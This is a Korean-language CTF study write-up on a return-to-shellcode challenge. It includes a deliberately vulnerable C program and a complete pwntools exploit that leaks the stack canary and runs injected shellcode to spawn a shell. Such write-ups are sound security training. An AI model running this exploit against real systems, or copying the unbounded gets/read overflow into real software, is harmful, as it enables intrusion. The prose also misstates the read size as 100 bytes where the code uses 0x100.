## 📍Return to Shellcode

### 소스코드

```c
// Name: r2s.c
// Compile: gcc -o r2s r2s.c -zexecstack

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  char buf[0x50];

  init();

  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n",
         (char*)__builtin_frame_address(0) - buf);

  printf("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);

  return 0;
}
```


### 분석
#### 보호기법 탐지

적용된 바이너리 보호기법에 따라 익스플로잇 설계가 달라지므로, 분석 전에 먼저 어떤 보호기법이 작용되었는지 파악하는 것이 좋다.

pwntools와 함께 설치되는 **checksec** 툴을 사용한다.

`$ checksec ./r2s`

![](Attachments/8DB0DD9C-D126-49C6-B4CB-65CEA4F4E022.png)

카나리가 적용되어 있다.

#### 취약점 탐색

##### buf의 주소
문제에서 `buf`의 주소 및 `rbp`와 `buf` 사이의 주소 차이를 알려주고 있다.
##### 스택 버퍼 오버플로우
스택 버퍼인 `buf`에 총 2번의 입력을 받는다.
`read` 함수에서 주어진 버퍼보다 더 큰 입력을 받을 수 있고, `gets` 함수는 입력 크기를 제한하지 않으므로 안전하지 않은 함수이다.

### 익스플로잇 시나리오
#### 카나리 우회

두 번째 입력(`gets`)으로 반환 주소를 덮을 수 있지만 카나리가 조작되면 `__stack_chk_fail` 함수에 의해 프로그램이 강제 종료된다.
![](Attachments/DF26A06C-04F4-455A-A96D-7D790162A035.png)

첫 번째 입력을 살펴보자:
```c
  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);
```
- 스택 버퍼에 최대 100바이트의 입력을 받는다.
- 입력을 받고 바로 직후에 `buf`의 내용을 문자열로 출력한다.
- `buf`에 적절한 오버플로우를 발생시켜서 카나리 값을 구하고, 구한 카나리 값을 두 번째 입력에 사용한다.

#### 셸 획득

카나리를 구하고 나면, 두 번째 입력으로 반환 주소를 덮을 수 있다.
이때, 바이너리에 셸을 획득하는 코드가 없으므로 직접 셸을 획득하는 코드를 주입하고 해당 코드로 실행 흐름을 옮겨야 한다.

`buf`의 주소는 프로그램이 출력해주므로 주소를 알고 있는 `buf`에 셸 코드를 주입하고 해당 주소로 실행 흐름을 옮겨 셸을 획득한다.

### 익스플로잇

#### 스택 프레임 정보 수집

```python
from pwn import *

def slog(n, m): return success(': '.join([n, hex(m)]))

p = process('./r2s')

context.arch = 'amd64'

p.recvuntil(b'buf: ')
buf = int(p.recvline()[:-1], 16)
slog('Adress of buf', buf)

p.recvuntil(b'$rbp: ')
buf2sfp = int(p.recvline().split()[0])
buf2cnry = buf2sfp -8
slog('buf <=> sfp', buf2sfp)
slog('buf <=> canary', buf2cnry)
```

#### 카나리 릭

스택 프레임에 대한 정보를 수집했으므로 이를 활용해 카나리를 구해야 한다.
`buf`와 카나리 사이를 임의의 값으로 채우면, 프로그램에서 `buf`를 출력할 때 카나리가 같이 출력된다.

![](Attachments/7DB10F8C-6142-4270-ABC3-813E0F263BE3.png)

```python
# [2] Leak canary value
payload = b'A'*(buf2cnry + 1) # (+1) because of the first null-byte

p.sendafter(b'Input:', payload)
p.recvuntil(payload)
cnry = u64(b'\x00'+p.recvn(7))
slog('Canary', cnry)
```

#### 익스플로잇

![](Attachments/561167F2-0E66-4661-ACF1-E015D440FDD0.png)

카나리를 구했으므로 `buf`에 셸코드를 주입하고 카나리를 구한 값으로 덮은 뒤 RET(반환 주소)를 `buf`로 덮으면 셸코드를 진행시킬 수 있다.

```python
# [3] Exploit
sh = asm(shellcraft.sh())
payload = sh.ljust(buf2cnry, b'A') + p64(cnry) + b'B'*0x8 + p64(buf)
# gets() receives input until '\n' is received
p.sendlineafter(b'Input:', payload)

p.interactive()
```

```python
#!/usr/bin/env python3
# Name: r2s.py
from pwn import *

def slog(n, m): return success(': '.join([n, hex(m)]))

p = process('./r2s')

context.arch = 'amd64'

# [1] Get information about buf
p.recvuntil(b'buf: ')
buf = int(p.recvline()[:-1], 16)
slog('Address of buf', buf)

p.recvuntil(b'$rbp: ')
buf2sfp = int(p.recvline().split()[0])
buf2cnry = buf2sfp - 8
slog('buf <=> sfp', buf2sfp)
slog('buf <=> canary', buf2cnry)

# [2] Leak canary value
payload = b'A'*(buf2cnry + 1) # (+1) because of the first null-byte

p.sendafter(b'Input:', payload)
p.recvuntil(payload)
cnry = u64(b'\x00'+p.recvn(7))
slog('Canary', cnry)

# [3] Exploit
sh = asm(shellcraft.sh())
payload = sh.ljust(buf2cnry, b'A') + p64(cnry) + b'B'*0x8 + p64(buf)
# gets() receives input until '\n' is received
p.sendlineafter(b'Input:', payload)

p.interactive()
```